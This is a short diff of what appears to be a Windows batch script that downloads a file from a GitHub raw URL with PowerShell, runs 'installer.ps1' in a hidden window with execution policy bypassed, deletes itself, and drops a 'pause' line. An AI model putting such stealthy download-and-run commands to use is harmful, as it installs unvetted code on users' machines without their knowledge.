@@ -36,6 +36,6 @@ powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3
 powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
 
 powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
-pause
+
 @REM self delete
 del wget.cmd
